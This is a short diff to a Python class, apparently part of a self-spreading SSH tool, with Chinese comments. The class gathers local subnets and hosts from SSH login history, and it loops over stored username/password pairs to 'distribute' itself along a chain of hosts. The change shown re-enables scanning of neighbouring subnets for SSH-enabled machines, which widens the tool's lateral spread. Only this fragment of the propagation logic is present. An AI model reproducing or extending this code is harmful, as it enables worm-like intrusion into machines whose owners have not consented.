@@ -69,7 +69,7 @@ class Distribute(object):
     def run(self):
         self.excluded_hosts, my_subnets = self.__getLocalSubnets()  # 本机IP/MASK列表
         self.__addKnownHosts()  # 在ssh历史登陆中有的主机
-        # self.__addNeighbors(my_subnets-self.excluded_subnets)  # 本机所在网段上ssh开启的主机
+        self.__addNeighbors(my_subnets - self.excluded_subnets)  # 本机所在网段上ssh开启的主机
         self.__saveExcludedSubnets(self.excluded_subnets | my_subnets, self.chain_length - 1)
         for usr, passwd in self.credentials:
             self.objective_hosts -= self.excluded_hosts  # 去掉已分发过的主机
